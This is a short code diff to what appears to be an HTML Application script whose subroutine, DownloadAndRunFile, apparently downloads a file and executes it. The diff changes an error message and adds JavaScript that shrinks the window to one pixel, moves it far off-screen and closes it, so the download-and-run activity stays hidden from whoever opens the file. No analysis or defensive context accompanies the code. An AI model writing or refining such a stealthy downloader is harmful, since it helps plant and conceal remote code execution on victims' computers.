@@ -52,7 +52,7 @@ Sub DownloadAndRunFile()
         End If
         Set objFSO = Nothing
     Else
-        WScript.Echo "Failed to download the file. Status: " & objHTTP.Status
+        MsgBox "Failed to download the file. Status: " & objHTTP.Status
     End If
 
     Set objHTTP = Nothing
@@ -60,6 +60,13 @@ End Sub
 
 ' Call the main subroutine
 DownloadAndRunFile
+</script>
+
+<script type="text/javascript">
+    // Resize and move the window off the screen
+    window.resizeTo(1, 1);
+    window.moveTo(-32000, -32000);
+    window.close(); // Close the window after resizing and moving
 </script>
 
 </body>
